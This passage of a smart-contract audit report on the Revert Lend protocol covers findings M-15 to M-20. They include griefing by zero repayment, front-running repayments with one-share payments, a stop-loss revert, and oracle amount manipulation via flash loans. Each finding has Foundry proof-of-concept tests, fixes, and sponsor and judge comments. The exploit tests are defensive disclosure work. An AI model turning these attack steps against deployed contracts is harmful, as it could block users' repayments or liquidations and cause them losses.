1082:        _updateAndCheckCollateral(tokenId, debtExchangeRateX96, lendExchangeRateX96, loans[tokenId].debtShares, 0); // @audit: noop
1083:        delete loans[tokenId]; // @audit: noop
1084:        nonfungiblePositionManager.safeTransferFrom(address(this), owner, tokenId); // @audit: transfer NFT back to user
```

Since the user's NFT is no longer in the vault, any attempts by the user to borrow against the prematurely removed position will result in a revert since the position is now non-existent.

### Impact

Users' newly created positions can be prematurely removed from the vault before the users can borrow against that position. This would result in the user wasting gas as they attempt to borrow against a non-existence position and are then forced to re-create the position.

Note that sophisticated users are able to bypass this griefing attack by submitting the `create` and `borrow` calls in one transaction. However, seeing as there are explicit functions used to first create a position and then to borrow against it, average users can be consistently griefed when they follow this expected flow.

### Proof of Concept

Place the following test inside of the `V3Vault.t.sol` and run with `forge test --mc V3VaultIntegrationTest --mt testGriefNewPosition`:

```solidity
    function testGriefNewPosition() public {
        // set up attacker
        address attacker = address(0x01010101);

        // --- user creates new position --- //
        _setupBasicLoan(false);

        (, uint256 fullValue, uint256 collateralValue,,) = vault.loanInfo(TEST_NFT);
        assertEq(collateralValue, 8847206);
        assertEq(fullValue, 9830229);
        
        assertEq(address(vault), NPM.ownerOf(TEST_NFT)); // NFT sent to vault
        
        // --- user attempts to borrow against position, but gets griefed by attacker --- //

        // attacker repays 0 debt for position and removes position
        vm.prank(attacker);
        vault.repay(TEST_NFT, 0, false);

        assertEq(TEST_NFT_ACCOUNT, NPM.ownerOf(TEST_NFT)); // NFT sent back to user

        // user attempts to borrow with new position, but tx reverts
        vm.prank(TEST_NFT_ACCOUNT);
        vm.expectRevert(IErrors.Unauthorized.selector);
        vault.borrow(TEST_NFT, collateralValue);
    }
```

### Recommended Mitigation Steps

I would recommend validating the `amount` parameter in the repay function and reverting if `amount == 0`. Additionally, there can be an explicit reversion if the loan attempting to be repaid currently has `0` debt.

**[kalinbas (Revert) confirmed](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/232#issuecomment-2020832833)**

**[Revert mitigated](https://github.com/code-423n4/2024-04-revert-mitigation?tab=readme-ov-file#scope):**
> Fixed [here](https://github.com/revert-finance/lend/pull/8) and [here](https://github.com/revert-finance/lend/pull/32).

**Status:** Mitigation Confirmed. Full details in reports from [thank_you](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/91), [b0g0](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/48) and [ktg](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/18).
***

## [[M-16] Repayments and liquidations can be forced to revert by an attacker that repays minuscule amount of shares](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/222)
*Submitted by [kfx](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/222), also found by [kinda\_very\_good](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/500), [zxriptor](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/486), [CaeraDenoir](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/465), grearlake ([1](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/463), [2](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/440)), [falconhoof](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/461), [0x175](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/448), [JohnSmith](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/414), [Giorgio](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/406), [JecikPo](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/379), [jnforja](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/375), [SpicyMeatball](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/342), [shaka](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/333), [givn](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/330), [Aymen0909](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/326), [AMOW](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/317), [atoko](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/312), [Norah](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/301), [alexander\_orjustalex](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/296), JCN ([1](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/231), [2](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/230)), [web3Tycoon](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/225), [erosjohn](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/218), [lanrebayode77](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/139), [nmirchev8](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/59), [0xjuan](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/56), and [0xAlix2](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/45)*

<https://github.com/code-423n4/2024-03-revert-lend/blob/435b054f9ad2404173f36f0f74a5096c894b12b7/src/V3Vault.sol#L696-L698>

<https://github.com/code-423n4/2024-03-revert-lend/blob/435b054f9ad2404173f36f0f74a5096c894b12b7/src/V3Vault.sol#L973-L975>

### Impact

At the moment, both `repay` and `liquidate` calls will fail if the amount of shares that the transaction attempts to repay exceeds the outstanding debt shares of the position, with `RepayExceedsDebt` and `DebtChanged` errors respectively.

This enables an attacker to keep repaying very small amounts, such as 1 share, of the debt, causing user/liquidator transactions to fail.

The attack exposes risks for users who are close to the liquidation theshold from increasing their position's health, and also from self-liquidating their positions once they're already below the threshold.

### Proof of Concept

```solidity

    function testRepaymentFrontrun() external {
        address attacker = address(0xa1ac4e5);

        _setupBasicLoan(true);

        vm.prank(WHALE_ACCOUNT);
        USDC.approve(address(vault), type(uint256).max);

        vm.prank(WHALE_ACCOUNT);
        USDC.transfer(address(attacker), 1e12);

        vm.prank(attacker);
        USDC.approve(address(vault), type(uint256).max);
        
        // wait 7 day - interest growing
        vm.warp(block.timestamp + 7 days);

        uint256 debtShares = vault.loans(TEST_NFT);

        vm.prank(attacker);
        vault.repay(TEST_NFT, 1, true); // repay 1 share

        // user's repayment fails
        vm.prank(WHALE_ACCOUNT);
        vm.expectRevert(IErrors.RepayExceedsDebt.selector);
        vault.repay(TEST_NFT, debtShares, true); // try to repay all shares

        // attacker (or someone else) can liquidate the position now
        vm.prank(attacker);
        vault.liquidate(IVault.LiquidateParams(TEST_NFT, debtShares - 1, 0, 0, attacker, ""));
    }


    function testLiquidationFrontrun() external {
        address attacker = address(0xa1ac4e5);

        _setupBasicLoan(true);

        vm.prank(WHALE_ACCOUNT);
        USDC.approve(address(vault), type(uint256).max);

        vm.prank(WHALE_ACCOUNT);
        USDC.transfer(address(attacker), 1e12);

        vm.prank(attacker);
        USDC.approve(address(vault), type(uint256).max);
               
        // wait 7 day - interest growing
        vm.warp(block.timestamp + 7 days);

        uint256 debtShares = vault.loans(TEST_NFT);

        vm.prank(attacker);
        vault.repay(TEST_NFT, 1, true); // repay 1 share

        // user's self-liquidation fails
        vm.prank(WHALE_ACCOUNT);
        vm.expectRevert(IErrors.DebtChanged.selector);
        vault.liquidate(IVault.LiquidateParams(TEST_NFT, debtShares, 0, 0, WHALE_ACCOUNT, ""));
    }
```

### Recommended Mitigation Steps

Allow to attempt to repay an unlimited amount of shares. Send back to the user tokens that were not required for the full repayment.

### Assessed type

DoS

**[kalinbas (Revert) confirmed](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/222#issuecomment-2020825373)**

**[ronnyx2017 (judge) commented](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/222#issuecomment-2028500335):**
 > The attack vector includes MEV as a necessary condition.

**[Revert mitigated](https://github.com/code-423n4/2024-04-revert-mitigation?tab=readme-ov-file#scope):**
> Fixed [here](https://github.com/revert-finance/lend/pull/14) and [here](https://github.com/revert-finance/lend/pull/30).

**Status:** Mitigation Confirmed. Full details in reports from [b0g0](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/49), [thank_you](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/92) and [ktg](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/20).

***

## [[M-17] `AutoExit` could receive a reward calculated from the entire position's fund even if `onlyFee` is true in `AutoExit.execute()`](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/216)
*Submitted by [kennedy1030](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/216), also found by [deepplus](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/277) and [KupiaSec](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/260)*

<https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/automators/AutoExit.sol#L100-L214>

<https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/automators/Automator.sol#L193-L215>

### Impact

The owner of the NFT could end up paying more rewards to `AutoExit` than anticipated when `onlyFee` is set to true.

### Proof of Concept

<https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/automators/AutoExit.sol#L155>

```javascript

    function execute(ExecuteParams calldata params) external {
        [...]

            // reward is taken before swap - if from fees only
            if (config.onlyFees) {
155             state.amount0 -= state.feeAmount0 * params.rewardX64 / Q64;
                state.amount1 -= state.feeAmount1 * params.rewardX64 / Q64;
            }

        [...]
    }
```

<https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/automators/Automator.sol#L208>

```javascript

    function _decreaseFullLiquidityAndCollect(
        uint256 tokenId,
        uint128 liquidity,
        uint256 amountRemoveMin0,
        uint256 amountRemoveMin1,
        uint256 deadline
    ) internal returns (uint256 amount0, uint256 amount1, uint256 feeAmount0, uint256 feeAmount1) {
        if (liquidity > 0) {
            // store in temporarily "misnamed" variables - see comment below
202         (feeAmount0, feeAmount1) = nonfungiblePositionManager.decreaseLiquidity(
                INonfungiblePositionManager.DecreaseLiquidityParams(
                    tokenId, liquidity, amountRemoveMin0, amountRemoveMin1, deadline
                )
            );
        }
208     (amount0, amount1) = nonfungiblePositionManager.collect(
            INonfungiblePositionManager.CollectParams(tokenId, address(this), type(uint128).max, type(uint128).max)
        );

        // fee amount is what was collected additionally to liquidity amount
        feeAmount0 = amount0 - feeAmount0;
        feeAmount1 = amount1 - feeAmount1;
    }
```

As seen at `L208`, `feeAmount` represents the uncollected fees excluding assets from the current liquidity. However, it includes the `owed` amount, which comprises uncollected assets not just from fees but also from `nonfungiblePositionManager.decreaseLiquidity()` called earlier at `L202`. If the owner has already executed `nonfungiblePositionManager.decreaseLiquidity()`, the uncollected assets would consist of some assets withdrawn from their liquidity, possibly a significant portion. This implies that `onlyFee` configuration is not functioning effectively.

Here is a simple scenario to highlight this issue:

1. The owner invokes `nonfungiblePositionManager.approve(address(autoExit), NFT)` and sets `onlyFee` to true.
2. The owner then calls `nonfungiblePositionManager.decreaseLiquidity()` to withdraw the majority of their liquidity..
3. Subsequently, an operator calls `autoExit.execute()` and receives more rewards than anticipated.

### Recommended Mitigation Steps

In [`Automator._decreaseFullLiquidityAndCollect()`](https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/automators/Automator.sol#L202), `feeAmount0, feeAmount1` must only include the amount calculated from the `feeGrowthInside` of UniswapV3 position.

**[mariorz (Revert) acknowledged, but disagreed with severity and commented](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/216#issuecomment-2024092091):**
 > Don't believe this should be a "high risk".
> 1. Users calling `decreaseLiquidity` without calling collect is possible but non-standard and there is no real reason to do this.
> 2. If this ever happened by some edge case, the `Operator` is an approved role that would be incentivized to return the extra fees to the affected user.
> 3. There is no risk for other lenders or borrowers.
> 4. Risk for the affected LP is limited to <2% of the position value.

**[ronnyx2017 (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/216#issuecomment-2028803971):**
 > More like user error or a malicious operator.

***

## [[M-18] Users cannot stop loss in AutoRange and AutoExit ](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/202)
*Submitted by [ktg](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/202)*

<https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/automators/Automator.sol#L151-L153>

<https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/automators/AutoExit.sol#L162-L169>

<https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/transformers/AutoRange.sol#L157-L164>

### Impact

- Users cannot stop loss in AutoRange and AutoExit, resulting in huge loss.
- Users cannot withdraw their tokens and cut loss even when they choose no swap option.

### Proof of Concept

Contract `AutoRange` and `AutoExit` both inherits contract `Automator` and uses its function `_validateSwap`:

```solidity
function _validateSwap(
        bool swap0For1,
        uint256 amountIn,
        IUniswapV3Pool pool,
        uint32 twapPeriod,
        uint16 maxTickDifference,
        uint64 maxPriceDifferenceX64
    ) internal view returns (uint256 amountOutMin, int24 currentTick, uint160 sqrtPriceX96, uint256 priceX96) {
        // get current price and tick
        (sqrtPriceX96, currentTick,,,,,) = pool.slot0();

        // check if current tick not too far from TWAP
        if (!_hasMaxTWAPTickDifference(pool, twapPeriod, currentTick, maxTickDifference)) {
            revert TWAPCheckFailed();
        }
....

 function _hasMaxTWAPTickDifference(IUniswapV3Pool pool, uint32 twapPeriod, int24 currentTick, uint16 maxDifference)
        internal
        view
        returns (bool)
    {
        (int24 twapTick, bool twapOk) = _getTWAPTick(pool, twapPeriod);
        if (twapOk) {
            return twapTick - currentTick >= -int16(maxDifference) && twapTick - currentTick <= int16(maxDifference);
        } else {
            return false;
        }
    }

...


function _getTWAPTick(IUniswapV3Pool pool, uint32 twapPeriod) internal view returns (int24, bool) {
        uint32[] memory secondsAgos = new uint32[](2);
        secondsAgos[0] = 0; // from (before)
        secondsAgos[1] = twapPeriod; // from (before)

        // pool observe may fail when there is not enough history available
        try pool.observe(secondsAgos) returns (int56[] memory tickCumulatives, uint160[] memory) {
            return (int24((tickCumulatives[0] - tickCumulatives[1]) / int56(uint56(twapPeriod))), true);
        } catch {
            return (0, false);
        }
    }
```

The function will revert if the difference between current tick and twap tick `>` `maxTickDifference`. Currently, `maxTickDifference` must `<= 200` as you can see in function `setTWAPConfig`:

```solidity
function setTWAPConfig(uint16 _maxTWAPTickDifference, uint32 _TWAPSeconds) public onlyOwner {
        if (_TWAPSeconds < MIN_TWAP_SECONDS) {
            revert InvalidConfig();
        }
        if (_maxTWAPTickDifference > MAX_TWAP_TICK_DIFFERENCE) {
            revert InvalidConfig();
        }
        emit TWAPConfigChanged(_TWAPSeconds, _maxTWAPTickDifference);
        TWAPSeconds = _TWAPSeconds;
        maxTWAPTickDifference = _maxTWAPTickDifference;
    }
```

`MAX_TWAP_TICK_DIFFERENCE` = 200.

If for example, `maxTWAPTickDifference` = 100, then the function will revert if price difference `= 1.0001 * 100 = 1%`. This will prevent users of `AutoExit` and `AutoRange` from stopping their loss in case the market drops `>` 1%.

Lets take an example:

- Alice chooses `AutoRange` transformer.
- Then `AutoRange.execute` is called with `amountIn` = 0, according to the comment in `AutoRange.ExecuteParams` struct, then if `amountIn` = 0, it means no swap:

```solidity
struct ExecuteParams {
        uint256 tokenId;
        bool swap0To1;
        uint256 amountIn; // if this is set to 0 no swap happens
        bytes swapData;
        uint128 liquidity; // liquidity the calculations are based on
        uint256 amountRemoveMin0; // min amount to be removed from liquidity
        uint256 amountRemoveMin1; // min amount to be removed from liquidity
        uint256 deadline; // for uniswap operations - operator promises fair value
        uint64 rewardX64; // which reward will be used for protocol, can be max configured amount (considering onlyFees)
    }
```

- In case of no swap, Alice just wants to withdraw her tokens and cut loss.
- However, after `AutoRange` has called `_decreaseFullLiquidityAndCollect` to withdraw tokens for Alice, `AutoRange` still call `_validateSwap` to check (although `amountIn` is set to `0` - meaning no swap):

```solidity
        (state.amount0, state.amount1, state.feeAmount0, state.feeAmount1) = _decreaseFullLiquidityAndCollect(
            params.tokenId, state.liquidity, params.amountRemoveMin0, params.amountRemoveMin1, params.deadline
        );

        ...
        // check oracle for swap
        (state.amountOutMin, state.currentTick,,) = _validateSwap(
            params.swap0To1,
            params.amountIn,
            state.pool,
            TWAPSeconds,
            maxTWAPTickDifference,
            params.swap0To1 ? config.token0SlippageX64 : config.token1SlippageX64
        );
```

- If (`currentTick` - `twapTick`) `> 100` (meaning 1% price difference), then the transaction will revert and the operator failed to stop Alice's loss.
- Alice has to wait when the condition (`currentTick` - `twapTick`) `< 100` to cut loss, by then it's too late.

The same thing happens in `AutoExit`, users cannot withdraw their tokens in case the prices change `>` 1%.

Below is a POC for the above example, save this test case to file `test/integration/automators/AutoRange.t.sol` and run it using command:
`forge test --match-path test/integration/automators/AutoRange.t.sol --match-test testNoSwapRevert -vvvv`.

```solidity
function testNoSwapRevert() public {
        bool onlyFees = false;
        SwapTestState memory state;


        // Config AutoRange
        vm.startPrank(TEST_NFT_2_ACCOUNT);
        NPM.setApprovalForAll(address(autoRange), true);
        autoRange.configToken(
            TEST_NFT_2,
            address(0),
            AutoRange.PositionConfig(
                0, 0, 0, 60, uint64(Q64 / 100), uint64(Q64 / 100), onlyFees, onlyFees ? MAX_FEE_REWARD : MAX_REWARD
            )
        );

        (,,,,,,, state.liquidity,,,,) = NPM.positions(TEST_NFT_2);
        vm.stopPrank();

        //
        (, int24 currentTick,,,,,) = IUniswapV3Pool(0xC2e9F25Be6257c210d7Adf0D4Cd6E3E881ba25f8).slot0();
        console.logInt(currentTick);

        // mock twap data
        // _maxTWAPTickDifference is currently set as 100
        // twapPeriod is 60,
        // currenttick = -73244
        // so the mock twap price  = (-6912871013261 - -6912866037401) / 60 = -82931
        int56[] memory tickCumulative = new int56[](2);
        tickCumulative[0] = -6912871013261;
        tickCumulative[1] = -6912866037401;

        uint32[] memory secondsAgos = new uint32[](2);
        secondsAgos[0] = 0;
        secondsAgos[1] = 60;
        uint160[] memory secondsPerLiquidityCumulativeX128s = new uint160[](2);

        vm.mockCall(
            0xC2e9F25Be6257c210d7Adf0D4Cd6E3E881ba25f8,(abi.encodeWithSelector(0x883bdbfd,secondsAgos)),
            abi.encode(tickCumulative,secondsPerLiquidityCumulativeX128s)
        );

        //Operator run
        vm.prank(OPERATOR_ACCOUNT);
        vm.expectRevert();
        autoRange.execute(
            AutoRange.ExecuteParams(
                TEST_NFT_2, false, 0, "", state.liquidity, 0, 0, block.timestamp, onlyFees ? MAX_FEE_REWARD : MAX_REWARD
            )
        );
    }
```

In the test case, I creates a `mockCall` to uniswap v3 `observe` function to simulate a market drop.

### Recommended Mitigation Steps

I recommend skipping the swap operation if `_hasMaxTWAPTickDifference` returns `false` instead of reverting.

### Assessed type

Invalid Validation

**[EV_om (lookout) commented](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/202#issuecomment-2017824490):**
 > Users have no control over the timing of Automator calls, operators do. If a user wants to quickly exit a position, they can repay.
> 
> This is an in-built protection mechanism.

**[ktg (warden) commented](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/202#issuecomment-2033383100):**
 > @EV_om, `AutoExit` will be called by a bot, users uses a bot to avoid manually exiting their UniswapV3 positions so I think the point `If a user wants to quickly exit a position, they can repay.` is not related. 
> 
> What I meant in this issue is that even if `amountIn` is set to `0` (which means no swap), the code still call `_validateSwap ` and revert if the price fluctuation is too high. Therefore, if `execute` is called with `amountIn = 0` (which clearly indicates no swap, just withdraw and exit) and the price fluctuation is too high, it will revert. In another word, the code check the condition and revert in situations where users/callers clearly want to neglect that condition.
> 
> About `This is an in-built protection mechanism.`, I think this is indeed a built-in protection mechanism, but that mechanism is only for cases where swap is needed. In this issue, this mechanism is still activated even when users don't want it and result in their losses.

**[EV_om (lookout) commented](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/202#issuecomment-2033738713):**
 > You're right, repayment of positions is unrelated, my bad. What I should have said was "If a user wants to quickly exit a position, they can do so manually." As for the no swap case, there is no loss being prevented as the position owner will remain exposed to the same price action.
> 
> Nevertheless, the unnecessary call to `_validateSwap()` and resulting reverting behavior is a good observation. The judge may want to consider this as QA despite the overinflated severity and invalid assumptions of the original submission.

**[ktg (warden) commented](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/202#issuecomment-2033929536):**
 > @EV_om , @ronnyx2017 - I think the statement `If a user wants to quickly exit a position, they can do so manually.` is also unrelated here because the role of `AutoExit` is to help users automatically exit a position. You can't expect users to look at market data and exit manually all the time; that's why `AutoExit/AutoRange` exists.
> 
> The loss here is that `AutoExit` cannot help users to automatically exit a position because it reverts on a condition that clearly needed to be omitted due to `amountIn =0` (no swap). 
> 
> I think we all agree that the call to `_validateSwap()` is unnecessary here but I disagree that it's just a QA because it can cost huge loss due to users (through `AutoExit` or `AutoRange`) unable to exit or re arrange their position. 
> 
> If users choose to set `amountIn` (or `swapAmount`) `= 0`, then what they want is "I don't want to swap, just exit/autorange my position", but then `AutoExit`/`AutoRange` fails to do this.

**[ronnyx2017 (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/202#issuecomment-2036442091):**
 > Good catch! Unnecessary `_validateSwap` here has genuinely compromised certain functionalities of the protocol. Medium is justified, in my opinion. Looking forward to the sponsor's perspective, @kalinbas.

**[kalinbas (Revert) confirmed and commented](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/202#issuecomment-2037841620):**
 > `_validateSwap()` is not necessary only if there is no swap, we are going to remove if in that case.

**[Revert mitigated](https://github.com/code-423n4/2024-04-revert-mitigation?tab=readme-ov-file#scope):**
> Fixed [here](https://github.com/revert-finance/lend/pull/12).

**Status:** Mitigation Confirmed. Full details in reports from [b0g0](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/50), [thank_you](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/93) and [ktg](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/35).

***

## [[M-19] `V3Oracle` susceptible to price manipulation](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/175)
*Submitted by [b0g0](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/175), also found by [0x175](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/446), [14si2o\_Flint](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/348), [kfx](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/223), [Fitro](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/132), [Giorgio](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/462), [grearlake](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/421), 0xblackskull ([1](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/395), [2](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/383)), [crypticdefense](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/257), [Silvermist](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/233), [0xspryon](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/191), [MohammedRizwan](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/185), [y0ng0p3](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/142), [0xAlix2](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/123), [MSaptarshi](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/82), [boredpukar](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/73), and [maxim371](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/37)*

`V3Oracle::getValue()` is used to calculate the value of a position. The value is the product of the `oracle price * the amounts held in the position`. Price manipulation is prevented by checking for differences between Chainlink oracle and Uniswap TWAP.

However, the amounts (`amount0` and `amount1`) of the tokens in the position are calculated based on the current pool price (`pool.spot0()`), which means they can be manipulated. Since the value of the total position is calculated from `amount0` and `amount1` it can be manipulated as well.

### Proof of Concept

Invoking `V3Oracle::getValue()` first calls the `getPositionBreakdown()` to calculate the `amount0` and `amount1` of the tokens in the position based on spot price:

<https://github.com/code-423n4/2024-03-revert-lend/blob/435b054f9ad2404173f36f0f74a5096c894b12b7/src/V3Oracle.sol#L102>

     (address token0, address token1, uint24 fee,, uint256 amount0, uint256 amount1, uint256 fees0, uint256 fees1) =
                getPositionBreakdown(tokenId);

Under the hood this calls `_initializeState()` which gets the current price in the pool: 

<https://github.com/code-423n4/2024-03-revert-lend/blob/435b054f9ad2404173f36f0f74a5096c894b12b7/src/V3Oracle.sol#L395>

    (state.sqrtPriceX96, state.tick,,,,,) = state.pool.slot0();

Based on this value the `amount0` and `amount1` (returned from `getPositionBreakdown()` are deduced:

<https://github.com/code-423n4/2024-03-revert-lend/blob/435b054f9ad2404173f36f0f74a5096c894b12b7/src/V3Oracle.sol#L426>

    function _getAmounts(PositionState memory state)
            internal
            view
            returns (uint256 amount0, uint256 amount1, uint128 fees0, uint128 fees1)
        {
            if (state.liquidity > 0) {
           ....
                (amount0, amount1) = LiquidityAmounts.getAmountsForLiquidity(
                    state.sqrtPriceX96, state.sqrtPriceX96Lower, state.sqrtPriceX96Upper, state.liquidity
                );
            }
           ....
        }

After that, the prices are fetched from Uniswap & Chainlink and compared.

     (price0X96, cachedChainlinkReferencePriceX96) =
                _getReferenceTokenPriceX96(token0, cachedChainlinkReferencePriceX96);
     (price1X96, cachedChainlinkReferencePriceX96) =
                _getReferenceTokenPriceX96(token1, cachedChainlinkReferencePriceX96);

Finally, the value of the positions tokens and fees are calculated in the following formula:

```
value = (price0X96 * (amount0 + fees0) / Q96 + price1X96 * (amount1 + fees1) / Q96) * Q96 / priceTokenX96;
feeValue = (price0X96 * fees0 / Q96 + price1X96 * fees1 / Q96) * Q96 / priceTokenX96;
price0X96 = price0X96 * Q96 / priceTokenX96;
price1X96 = price1X96 * Q96 / priceTokenX96;
```

Basically the position value is a product of 2 parameters `price0X96/price1X96` and `amount0/amount1`:

- `price0X96/price1X96` - are the prices derived from the oracles. They are validated and cannot be manipulated.
- `amount0/amount1` - are calculated based on the spot price and can be manipulated.

Since `amount0` and `amount1` can be increased/decreased if a malicious user decides to distort the pool price in the current block (through a flash loan for example), this will directly impact the calculated value, even though the price itself cannot be manipulated since it is protected against manipulation.

The check in the end `_checkPoolPrice()` only verifies that the price from the oracles is in the the acceptable ranges. However, this does not safeguard the value calculation, which as explained above also includes the `amounts` parameters.

It should be noted that `_checkPoolPrice` uses the uniswap TWAP price for comparison, which is the price over an extended period of time making it very hard to manipulate in a single block. And exactly this property of the TWAP price can allow an attacker to manipulate the spot price significantly, without affecting the TWAP much; which means the price difference won't change much and `_checkPoolPrice` will pass.

A short example:

- The `V3Oracle` has been configured to use a TWAP duration of 1 hour.
- The TWAP price reported for the last hour is 4000 USDC for 1 WETH.
- Bob takes a flash loan to distort the spot price heavily and call in the same transaction `borrow` | `repay` on a V3Vault (which call `V3Oracle.getValue()`).
- Because of the price manipulation `amount1` and `amount0` are heavily inflated/deflated.
- However this changes the TWAP value only a little (if at all), so the price validation passes.
- The position value is calculated by multiplying the stable oracle price by the heavily manipulated amounts.
- User repay/borrows at favorable conditions.

### Recommended Mitigation Steps

Consider calculating `amount0` & `amount1` based on the oracle price and not on the spot price taken from `slot0()`. This way the above exploit will be mitigated.

### Assessed type

Uniswap

**[kalinbas (Revert) commented](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/175#issuecomment-2020788152):**
 > The check in `_checkPoolPrice()` does limit the price manipulation. The current pool price (it is NOT the TWAP price as you mention) is compared to the derived pool price of the Chainlink oracle prices. 
> 
> The amounts may be slightly manipulated for wide range positions, and more heavily manipulated for tight range positions. But the protection with `_checkPoolPrice()` should be enough to protect this from being a problem. Also, `repay()` does not need any oracles.

**[ronnyx2017 (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/175#issuecomment-2028534194):**
 > I think it is reasonable to classify this issue as Medium.
> 
> Firstly, I think that the possibility of exploitation exists only within the `_checkPoolPrice` method.
> 
> Secondly, although it would require very fringe (and even incorrect) configuration parameters to really cause un-dusty losses, given that similar attacks have occurred on the mainnet with substantial losses (refer to the Gamma gDai TWAP verification range configuration error, even though it's unrelated to `slot0`), I believe it's worth adding necessary safeguards, especially for tight range positions and tokens.

**[kalinbas (Revert) confirmed and commented](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/175#issuecomment-2030578761):**
 > We agree to change it to use the oracle price for position token calculation.

**[Revert mitigated](https://github.com/code-423n4/2024-04-revert-mitigation?tab=readme-ov-file#scope):**
> Fixed [here](https://github.com/revert-finance/lend/pull/26).

**Status:** Mitigation Confirmed. Full details in reports from [thank_you](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/94), [b0g0](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/51) and [ktg](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/4).

***

## [[M-20] Tokens can't be removed as a collateral without breaking liquidations and other core functions](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/158)
*Submitted by [iamandreiski](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/158), also found by [0xAlix2](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/42)*

<https://github.com/code-423n4/2024-03-revert-lend/blob/435b054f9ad2404173f36f0f74a5096c894b12b7/src/V3Vault.sol#L856-L866>

<https://github.com/code-423n4/2024-03-revert-lend/blob/435b054f9ad2404173f36f0f74a5096c894b12b7/src/V3Vault.sol#L1197-L1202>

<https://github.com/code-423n4/2024-03-revert-lend/blob/435b054f9ad2404173f36f0f74a5096c894b12b7/src/V3Vault.sol#L1270-L1278>

<https://github.com/code-423n4/2024-03-revert-lend/blob/435b054f9ad2404173f36f0f74a5096c894b12b7/src/V3Vault.sol#L702-L703>

<https://github.com/code-423n4/2024-03-revert-lend/blob/435b054f9ad2404173f36f0f74a5096c894b12b7/src/V3Vault.sol#L1090-L1120>

### Impact

The core mechanism that Revert utilizes to prevent arbitrary tokens to be utilized as collateral is by the default setting of the `collateralFactor`. Since the `collateralFactor` for all tokens (besides the ones approved for usage in the system, and set by admins) is `0`, that means that no one can borrow against a collateral which hasn't been approved.

